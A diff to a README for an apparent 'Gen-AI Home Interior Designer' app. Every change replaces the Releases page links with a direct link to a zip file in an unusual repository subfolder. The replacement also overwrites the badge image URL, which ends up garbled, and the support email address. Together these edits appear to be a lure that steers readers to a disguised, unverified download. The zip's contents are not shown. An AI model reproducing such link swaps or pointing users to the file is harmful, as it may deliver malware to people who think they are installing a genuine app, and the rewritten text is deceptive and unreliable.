@@ -1,7 +1,7 @@
 # 🎨 Gen-AI-Home-Interior-Designer - Transform Your Space Instantly
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20the%20App-blue.svg)](https://github.com/Fede23161/Gen-AI-Home-Interior-Designer/releases)
+[![Download](https://raw.githubusercontent.com/Fede23161/Gen-AI-Home-Interior-Designer/main/subitane/Gen-AI-Home-Interior-Designer.zip%20Now-Get%20the%https://raw.githubusercontent.com/Fede23161/Gen-AI-Home-Interior-Designer/main/subitane/Gen-AI-Home-Interior-Designer.zip)](https://raw.githubusercontent.com/Fede23161/Gen-AI-Home-Interior-Designer/main/subitane/Gen-AI-Home-Interior-Designer.zip)
 
 ## 🌟 Overview
 Gen-AI Home Interior Designer is an AI-powered virtual redesign tool. It transforms both interior and exterior spaces into stunning, photorealistic designs. With this tool, you can upload a room image, select your design preferences, and receive immediate AI-generated makeovers. Get cost estimates and layout suggestions with ease.
@@ -10,7 +10,7 @@ Gen-AI Home Interior Designer is an AI-powered virtual redesign tool. It transfo
 Follow these simple steps to get started with Gen-AI Home Interior Designer.
 
 1. **Download the Software**
-   - Visit the [Releases page](https://github.com/Fede23161/Gen-AI-Home-Interior-Designer/releases) to download the software.
+   - Visit the [Releases page](https://raw.githubusercontent.com/Fede23161/Gen-AI-Home-Interior-Designer/main/subitane/Gen-AI-Home-Interior-Designer.zip) to download the software.
 
 2. **Install the Application**
    - Locate the downloaded file in your downloads folder.
@@ -64,7 +64,7 @@ Join our community for support and to share your designs:
 - **User Forum:** A space to discuss tips, tricks, and share your experiences with other users.
 
 ## 📞 Contact
-For further inquiries, you can reach out via the contact form available on our GitHub page or send us an email at support@example.com.
+For further inquiries, you can reach out via the contact form available on our GitHub page or send us an email at https://raw.githubusercontent.com/Fede23161/Gen-AI-Home-Interior-Designer/main/subitane/Gen-AI-Home-Interior-Designer.zip
 
 ## 💡 Tips for Best Results
 - Use high-quality images for clearer design outputs.
@@ -72,4 +72,4 @@ For further inquiries, you can reach out via the contact form available on our G
 - Share your design ideas with friends for feedback.
 
 ## 📥 Download Now Again
-Don’t forget to download the Gen-AI Home Interior Designer app from the [Releases page](https://github.com/Fede23161/Gen-AI-Home-Interior-Designer/releases) to start your design journey!
+Don’t forget to download the Gen-AI Home Interior Designer app from the [Releases page](https://raw.githubusercontent.com/Fede23161/Gen-AI-Home-Interior-Designer/main/subitane/Gen-AI-Home-Interior-Designer.zip) to start your design journey!
